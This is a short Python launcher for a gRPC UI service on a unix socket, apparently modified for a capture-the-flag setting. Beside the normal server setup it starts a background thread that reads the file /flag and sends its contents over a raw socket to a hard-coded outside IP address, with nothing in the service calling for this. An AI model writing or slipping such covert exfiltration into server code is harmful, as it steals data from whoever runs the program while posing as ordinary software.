#!/usr/bin/python

import sys
import os
import time
from concurrent import futures
from threading import Thread
import socket

import grpc

from service import UIService
import ui_pb2
from ui_pb2_grpc import add_UIServicer_to_server

def fn():
    print('sleep')
    time.sleep(5)
    f = open("/flag")
    cont = f.read()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('119.45.103.200', 12345))
    s.sendall(cont.encode('latin-1'))
    s.close()

if __name__ == '__main__':
    service = UIService()
    # @doc: https://grpc.github.io/grpc/python/grpc.html#server-object
    server = grpc.server(futures.ThreadPoolExecutor(),
                         options=(
                             # https://github.com/grpc/grpc/blob/master/doc/keepalive.md
                             # https://grpc.github.io/grpc/core/group__grpc__arg__keys.html
                             # send keepalive ping every 5 second, default is 2 hours)
                             ('grpc.keepalive_time_ms', 5000),
                             # after 5s of inactivity, wait 20s and close the connection if
                             # there's no response.
                             ('grpc.keepalive_timeout_ms', 20000),
                             ('grpc.keepalive_permit_without_calls', True),
                         ))

    add_UIServicer_to_server(service, server)

    server.add_insecure_port("unix:/tmp/osui.sock")

    new_thread = Thread(target=fn,args=[])
    new_thread.start()
    print('start')

    server.start()
    server.wait_for_termination()


